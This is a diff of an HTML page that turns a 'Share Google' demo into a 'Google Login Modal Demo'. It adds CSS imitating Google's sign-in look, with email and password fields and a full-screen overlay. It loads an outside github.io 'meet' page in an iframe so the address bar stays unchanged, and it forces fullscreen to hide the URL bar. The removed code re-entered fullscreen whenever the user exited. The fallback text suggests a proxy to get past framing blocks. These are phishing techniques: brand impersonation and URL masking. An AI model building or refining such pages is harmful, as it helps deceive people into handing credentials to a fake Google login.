@@ -1,56 +1,120 @@
+
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Share Google Demo</title>
+  <title>Google Login Modal Demo</title>
+  <!-- Google Fonts for authentic look (Roboto) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    body { margin: 0; font-family: Arial, sans-serif; background: #f0f0f0; text-align: center; overflow: hidden; }
-    iframe { width: 100%; height: 100vh; border: none; display: none; } /* Versteckt bis geladen */
-    .loading { font-size: 18px; padding: 50px; }
-    .fallback { color: red; font-size: 18px; padding: 20px; display: none; }
-    button { padding: 10px 20px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; margin-top: 20px; }
+    /* Reset for clean look */
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #f0f0f0; /* Neutral background */
+      overflow: hidden; /* Hide scrollbars to mimic full takeover */
+    }
+    /* Full-screen overlay (dark semi-transparent) */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6); /* Dark tint for focus */
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      animation: fadeIn 0.3s ease-in-out; /* Smooth appearance */
+    }
+    /* Modal box styled like Google's login */
+    .modal {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+      width: 90%;
+      max-width: 400px;
+      padding: 24px;
+      text-align: center;
+    }
+    /* Google logo (simple SVG for demo) */
+    .google-logo {
+      width: 75px;
+      height: 24px;
+      margin-bottom: 16px;
+    }
+    /* Input fields like Google's */
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    /* Google blue button */
+    .google-button {
+      background: #4285f4; /* Google's blue */
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 16px;
+    }
+    .google-button:hover {
+      background: #357ae8;
+    }
+    /* Footer text like Google's */
+    .footer-text {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 16px;
+    }
+    /* Fade-in animation */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
   </style>
 </head>
+
+
 <body>
-  <div class="loading">
-    <p>Statischer Link: https://share.google/?link=... (bleibt in der Adresszeile)</p>
-    <p>Lade Inhalt ohne Redirect...</p>
-    <button onclick="loadContent()">Inhalt laden und Full-Screen</button>
+  <!-- Static page content with iframe for masked loading -->
+  <div style="text-align: center; padding: 20px;">
+    <h1>Static URL Demo</h1>
+    <p>The URL in the address bar remains static (e.g., your encoded link or this demo page). Click below to load the GitHub content without redirecting.</p>
+    <button onclick="loadStaticContent()" style="padding: 10px 20px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer;">
+      Load GitHub Page Statically
+    </button>
   </div>
-  
-  <!-- Iframe für statisches Laden ohne Redirect -->
-  <iframe id="maskedFrame" src="https://em2778708-glitch.github.io/meet/" onload="showFrame()" onerror="showFallback()"></iframe>
-  
-  <!-- Fallback -->
-  <div class="fallback" id="fallback">
-    Inhalt konnte nicht geladen werden (Blockade durch die Seite). Verwende einen Proxy!
+
+  <!-- Iframe for static loading (initially hidden) -->
+  <iframe id="staticFrame" src="https://em2778708-glitch.github.io/meet/" style="width: 100%; height: 80vh; border: none; display: none;" onload="this.style.display='block';"></iframe>
+
+  <!-- Fallback if iframe fails -->
+  <div id="fallback" style="color: red; font-size: 18px; padding: 20px; display: none;">
+    Content could not be loaded (possibly due to framing restrictions). Edit the HTML to remove redirects or use a proxy.
   </div>
 
   <script>
-    function loadContent() {
-      document.querySelector('.loading').style.display = 'none';
-      document.getElementById('maskedFrame').style.display = 'block';
-      goFullScreen(); // Versteckt URL-Bar
-    }
-
-    function showFrame() {
-      // Erfolgreich geladen – nichts zu tun
-    }
-
-    function showFallback() {
-      document.getElementById('fallback').style.display = 'block';
-    }
-
-    function goFullScreen() {
-      var elem = document.documentElement;
-      if (elem.requestFullscreen) elem.requestFullscreen();
-      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-      // ... weitere Browser
-      document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) goFullScreen(); // Re-enter
-      });
+    function loadStaticContent() {
+      var frame = document.getElementById('staticFrame');
+      frame.onerror = function() {
+        document.getElementById('fallback').style.display = 'block';
+      };
+      // Optional: Go full-screen to hide URL bar
+      if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
     }
   </script>
 </body>
+
+
 </html>
